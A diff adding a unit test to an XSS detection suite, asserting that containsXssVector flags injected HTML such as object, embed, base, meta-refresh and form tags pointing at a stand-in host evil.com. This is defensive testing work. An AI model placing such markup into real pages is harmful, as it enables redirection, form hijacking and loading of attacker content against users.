@@ -47,6 +47,19 @@ describe("containsXssVector — event handlers", () => {
     expect(containsXssVector("ontoggle=alert(1)")).toBe(true);
     expect(containsXssVector("onmouseover=alert(1)")).toBe(true);
   });
+
+  it("detects dangerous HTML/SVG/meta/object/base/form/math/style/template containers", () => {
+    expect(containsXssVector('<svg><use href="data:image/svg+xml,..."></svg>')).toBe(true);
+    expect(containsXssVector('<object data="//evil.com/x.swf"></object>')).toBe(true);
+    expect(containsXssVector('<base href="https://evil.com/">')).toBe(true);
+    expect(containsXssVector('<meta http-equiv="refresh" content="0;url=https://evil.com">')).toBe(
+      true,
+    );
+    expect(containsXssVector('<embed src="//evil.com/x.swf">')).toBe(true);
+    expect(containsXssVector('<form action="https://evil.com">')).toBe(true);
+    expect(containsXssVector("<style>body{display:none}</style>")).toBe(true);
+    expect(containsXssVector("<template><img src=x></template>")).toBe(true);
+  });
 });
 
 describe("sanitizeObject — gate behavior", () => {
